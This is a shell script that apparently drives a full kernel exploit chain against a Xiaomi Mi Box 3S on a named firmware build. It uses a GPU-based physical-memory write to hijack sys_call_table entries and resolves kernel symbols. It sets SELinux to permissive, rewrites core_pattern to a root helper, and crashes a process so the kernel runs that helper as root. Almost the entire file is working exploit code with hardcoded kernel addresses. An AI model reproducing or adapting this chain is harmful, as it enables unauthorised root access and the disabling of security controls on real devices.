#!/system/bin/sh
#
# run.sh - drive the full chain on a Xiaomi Mi Box 3S (MDZ-19-AA).
#
# Target firmware: build 8.2.2.817, Android 6.0.1 (SDK 23),
#                  kernel 3.14.29-301318-g9206404 (arm64), SELinux Enforcing.
#
# Why this differs from the MiTV4 variant (details in PORT_MIBOX3S.md):
#   1. /dev/ion mmap is broken on this firmware - every mapping returns
#      0x400008, so the ion-based gpu_arb_write cannot fill its command buffer
#      and never submits a job.  gpwrite() uses a plain file page instead, takes
#      the physical address from /proc/self/pagemap and attaches the page with
#      the external-memory backend.
#   2. sys_call_table must be reached from an aarch64 process; a 32-bit caller
#      is dispatched through compat_sys_call_table (which lives in .text), so
#      the write half is built 64-bit here too.
#   3. sys_call_table's cache line is read on every syscall and stays hot, so a
#      DMA write is invisible until the line is evicted.  Both helpers walk an
#      8 MB buffer (cache_thrash) right before they need the new value.
#
# Only two firmware-specific constants are needed; everything else is resolved
# at run time through the kernel's own symbol table.
#
#   KLN_ADDR   address of kallsyms_lookup_name
#   SLOT_PHYS  physical address of sys_call_table[244]
#              (= (virtual sys_call_table) + 0x7a0 - 0xffffffc000000000)
#
# Override either one from the environment for a different build.

set -u
D=/data/local/tmp

KLN_ADDR=${KLN_ADDR:-ffffffc00111e5d0}   # kallsyms_lookup_name, build 8.2.2.817
SLOT_PHYS=${SLOT_PHYS:-1ee77a0}          # sys_call_table[244] physical

GW=${GW:-$D/gpwrite64}
KF=${KF:-$D/kfunc_new}

say() { echo "[run] $*"; }
die() { echo "[run] FATAL: $*" >&2; exit 1; }

[ -x "$GW" ] || die "$GW missing (build: make gpwrite64)"
[ -x "$KF" ] || die "$KF missing (build: make kfunc_new)"

# ---- stage 0: point the 16 unused syscall slots at kallsyms_lookup_name ----
say "stage 0: sys_call_table[244..259] <- kallsyms_lookup_name"
"$GW" write "$SLOT_PHYS" "$KLN_ADDR" || die "gpu write failed"

# ---- stage 1: resolve what we need from the kernel's symbol table ----
resolve() {
    out=$("$KF" sym "$1" 2>/dev/null) || die "cannot resolve $1 (slot wrong?)"
    echo "$out" | awk -F'0x' '{print $2}' | tail -1
}

MEMCPY=$(resolve memcpy)
SELINUX_ENFORCING=$(resolve selinux_enforcing)
CORE_PATTERN=$(resolve core_pattern)
[ -n "$MEMCPY" ] || die "resolved an empty memcpy"
say "memcpy            = 0x$MEMCPY"
say "selinux_enforcing = 0x$SELINUX_ENFORCING"
say "core_pattern      = 0x$CORE_PATTERN"

# ---- stage 2: turn the same slots into memcpy ----
say "stage 2: sys_call_table[244..259] <- memcpy"
"$GW" write "$SLOT_PHYS" "$MEMCPY" || die "gpu write failed"

# ---- stage 3: SELinux -> permissive ----
say "stage 3: selinux_enforcing = 0"
"$KF" zero "0x$SELINUX_ENFORCING" 4 || die "write failed"
say "getenforce -> $(getenforce 2>/dev/null)"

# ---- stage 4: point core_pattern at a root helper ----
say "stage 4: core_pattern <- |$D/roothelper.sh"
"$KF" str "0x$CORE_PATTERN" "|$D/roothelper.sh" || die "write failed"

# ---- stage 5: trigger a core dump; the kernel runs the helper as root ----
say "stage 5: triggering coredump"
rm -f "$D/root.log"
if [ -x "$D/crash_for_core" ]; then
    "$D/crash_for_core"
else
    ulimit -c unlimited 2>/dev/null
    ( kill -SEGV $$ ) 2>/dev/null
fi
sleep 2

if [ -f "$D/root.log" ]; then
    say "success - helper ran as root:"
    sed 's/^/    /' "$D/root.log"
else
    say "helper did not run (check dmesg / the core_pattern value)"
    exit 3
fi
